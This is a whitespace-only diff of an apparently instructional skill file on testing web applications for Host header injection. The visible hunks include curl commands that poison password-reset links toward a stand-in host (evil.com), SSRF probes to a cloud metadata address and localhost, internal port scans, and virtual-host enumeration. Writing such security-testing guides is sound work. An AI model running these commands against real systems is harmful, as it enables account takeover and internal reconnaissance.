@@ -1,8 +1,8 @@
 ---
 name: testing-for-host-header-injection
 description: Test web applications for HTTP Host header injection vulnerabilities
-  to identify password reset poisoning, web cache poisoning, SSRF, and virtual host
-  routing manipulation risks.
+ to identify password reset poisoning, web cache poisoning, SSRF, and virtual host
+ routing manipulation risks.
 domain: cybersecurity
 subdomain: web-application-security
 tags:
@@ -78,27 +78,27 @@ curl -H "Host: localhost" http://target.com/ -v
 # Trigger password reset with modified Host header
 # The reset link may use the Host header value in the URL
 curl -X POST http://target.com/forgot-password \
-  -H "Host: evil.com" \
-  -d "email=victim@target.com"
+ -H "Host: evil.com" \
+ -d "email=victim@target.com"
 # If reset email contains: http://evil.com/reset?token=xxx
 # Attacker receives the token when victim clicks the link
 
 # Try X-Forwarded-Host for password reset poisoning
 curl -X POST http://target.com/forgot-password \
-  -H "X-Forwarded-Host: evil.com" \
-  -d "email=victim@target.com"
+ -H "X-Forwarded-Host: evil.com" \
+ -d "email=victim@target.com"
 
 # Port-based injection in reset URL
 curl -X POST http://target.com/forgot-password \
-  -H "Host: target.com:80@evil.com" \
-  -d "email=victim@target.com"
+ -H "Host: target.com:80@evil.com" \
+ -d "email=victim@target.com"
 
 # Test with various forwarding headers
 for header in "X-Forwarded-Host" "X-Host" "X-Original-URL" "X-Rewrite-URL" "X-Forwarded-Server" "Forwarded"; do
-  curl -X POST http://target.com/forgot-password \
-    -H "$header: evil.com" \
-    -d "email=victim@target.com"
-  echo "Tested: $header"
+ curl -X POST http://target.com/forgot-password \
+ -H "$header: evil.com" \
+ -d "email=victim@target.com"
+ echo "Tested: $header"
 done
 ```
 
@@ -134,8 +134,8 @@ curl -H "Host: 169.254.169.254" http://target.com/
 
 # Internal port scanning
 for port in 80 443 8080 8443 3000 5000 9200; do
-  curl -H "Host: 127.0.0.1:$port" http://target.com/ -o /dev/null -w "%{http_code}" -s
-  echo " - Port $port"
+ curl -H "Host: 127.0.0.1:$port" http://target.com/ -o /dev/null -w "%{http_code}" -s
+ echo " - Port $port"
 done
 
 # SSRF via absolute URL
@@ -146,9 +146,9 @@ curl --request-target "http://internal-server/" -H "Host: internal-server" http:
 ```bash
 # Enumerate virtual hosts
 for vhost in admin staging dev test api internal backend; do
-  status=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{http_code}" -s)
-  size=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{size_download}" -s)
-  echo "$vhost.target.com - Status: $status, Size: $size"
+ status=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{http_code}" -s)
+ size=$(curl -H "Host: $vhost.target.com" http://target.com/ -o /dev/null -w "%{size_download}" -s)
+ echo "$vhost.target.com - Status: $status, Size: $size"
 done
 
 # Check default virtual host behavior
